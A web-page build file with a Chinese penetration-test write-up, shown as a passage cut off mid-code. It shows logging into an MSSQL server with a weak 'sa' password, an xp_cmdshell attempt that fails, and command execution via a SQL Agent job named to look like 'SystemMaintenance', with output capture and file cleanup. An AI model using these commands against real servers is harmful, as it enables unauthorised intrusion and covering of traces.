import{_ as i}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,b as n,o as l}from"./app-CbXzZBr7.js";const e={};function h(t,s){return l(),a("div",null,s[0]||(s[0]=[n(`<p><code>fscan</code>扫描，爆出<code>mssql</code>弱密码<code>san:1</code><br> 使用sqsh连接mssql</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sqsh</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 10.99.xx.xx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -U</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> sa</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -P</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="首次xp-cmdshellrce尝试" tabindex="-1"><a class="header-anchor" href="#首次xp-cmdshellrce尝试"><span>首次<code>xp_cmdshell</code>RCE尝试</span></a></h2><p>为了执行命令，首先查看最短最方便的路径<code>xp_cmdshell</code>命令执行<br> 启动<code>xp_cmdshell</code></p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">1&gt; EXEC sp_configure </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;show advanced options&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, 1; </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">2&gt; RECONFIGURE; </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">3&gt; go </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Configuration</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> option</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;show advanced options&#39;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> changed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> from</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 1.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Run</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> the</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> RECONFIGURE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> statement</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> install.</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (return </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>查询<code>xp_cmdshell</code>是否启用</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">1&gt;EXEC sp_configure </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;xp_cmdshell&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">go</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">name</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">        ----------------------------------------------------------------------------------------------------------------</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">        xp_cmdshell</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">        minimum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">     maximum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">     config_value</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> run_value</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">        -----------</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -----------</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> ------------</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -----------</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">                  0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">           1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">            1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">           1</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>显示已经启用<br> 但是在命令执行时却出现问题</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">1&gt; EXEC xp_cmdshell </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;whoami&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">2&gt; go </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Msg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 15121,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Level</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 16,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> State</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 21</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Server</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;ZHANGWEI&#39;,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Procedure</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;xp_cmdshell&#39;,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Line</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">An</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> error</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> occurred</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> during</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> the</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> execution</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> xp_cmdshell.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> call</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;CreateProcess&#39;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> failed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> with</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> error</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> code:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;5&#39;.</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (return </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 15121</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>错误代码5，这表示“访问被拒绝”。这通常是由于SQL Server服务账户没有足够的权限来执行命令。<br> 尝试使用方案二进行命令执行</p><h2 id="sql-agent-作业rce" tabindex="-1"><a class="header-anchor" href="#sql-agent-作业rce"><span>SQL Agent 作业RCE</span></a></h2><p>首先查询<code>SQL Agent</code>是否启动</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">1&gt; DECLARE @agent_status INT; </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">EXEC</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> master.dbo.xp_regread</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&#39;HKEY_LOCAL_MACHINE&#39;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&#39;SYSTEM\\CurrentControlSet\\Services\\SQLSERVERAGENT&#39;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&#39;Start&#39;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">@agent_status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> OUTPUT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">SELECT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">	CASE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> @agent_status</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">		WHEN</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> THEN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;Auto Start&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">		WHEN</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> THEN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;Manual Start&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">		WHEN</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 4</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> THEN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;Disabled&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">		ELSE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;Unknown&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">	END</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> AS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> AgentStatus</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">2&gt; go </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">return</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) </span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">AgentStatus</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">------------------------------------------------</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Auto</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Start</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (1 </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">row</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> affected</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>查询到<code>agent</code>状态为自启动，意味指<code>agent</code>现在处于启动状态</p><h3 id="准备步骤" tabindex="-1"><a class="header-anchor" href="#准备步骤"><span>准备步骤</span></a></h3><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">1&gt; USE msdb; </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">2&gt; go </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">1&gt; EXEC dbo.sp_add_job </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">	@job_name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;SystemMaintenance&#39;,</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">	@enabled</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 1,</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">	@description</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;System maintenance tasks&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">2&gt; go </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">return</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>切换上下文到msdb系统数据库<br> 执行系统存储过程 <code>sp_add_job</code>，并设置相应参数以及描述<br><em><strong>总结</strong></em>：<br> 这段代码在 <code>msdb</code>数据库中创建了一个名为 ​<strong>​<code>SystemMaintenance</code>​</strong>​ 的 SQL Server 代理作业，该作业处于启用状态，并添加了描述信息。后续需要进一步配置作业步骤（如备份数据库、重建索引等）和调度计划，才能使作业实际运行。</p><h3 id="添加作业步骤" tabindex="-1"><a class="header-anchor" href="#添加作业步骤"><span>添加作业步骤</span></a></h3><p>步骤一：</p><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" data-title="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">EXEC</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> dbo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">sp_add_jobstep</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @job_name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;SystemMaintenance&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @step_name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;RunWhoami&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @subsystem</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;CMDEXEC&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @command</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;whoami &gt; C:\\Windows\\Temp\\output.txt&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @retry_attempts</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @retry_interval</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 5</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">go</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">return</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> status</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<strong>​参数​</strong>​：</p><ul><li><code>@subsystem = &#39;CMDEXEC&#39;</code>：执行操作系统命令</li><li><code>@command = &#39;whoami&#39;</code>：显示当前用户身份</li><li><code>@retry_attempts = 1</code>：失败时重试1次</li><li><code>@retry_interval = 5</code>：重试间隔5分钟</li></ul><p>（TSQL步骤）步骤二：</p><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" data-title="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">EXEC</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> dbo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">sp_add_jobstep</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @job_name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;SystemMaintenance&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @step_name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;CaptureOutput&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @subsystem</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;TSQL&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @command</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;DECLARE @output VARCHAR(MAX);</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">               SET @output = (SELECT output FROM OPENROWSET(BULK N&#39;&#39;C:\\Windows\\Temp\\output.txt&#39;&#39;, SINGLE_CLOB) AS Contents);</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">               EXEC msdb.dbo.sp_update_job @job_name = &#39;&#39;SystemMaintenance&#39;&#39;, @description = @output;&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @database_name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;msdb&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @on_success_action</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">go</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">return</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> status</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><strong>作用​</strong>​： <ol><li>读取第一步生成的 <code>C:\\Windows\\Temp\\output.txt</code>文件</li><li>将文件内容更新到作业描述中</li></ol></li><li>​<strong>​关键参数​</strong>​： <ul><li><code>@on_success_action = 3</code>：成功后转到下一步骤</li></ul></li></ul><p>步骤三：</p><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" data-title="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">EXEC</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> dbo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">sp_add_jobstep</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @job_name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;SystemMaintenance&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @step_name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;Cleanup&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @subsystem</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;CMDEXEC&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @command</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;del C:\\Windows\\Temp\\output.txt&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @on_success_action</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">go</span></span>
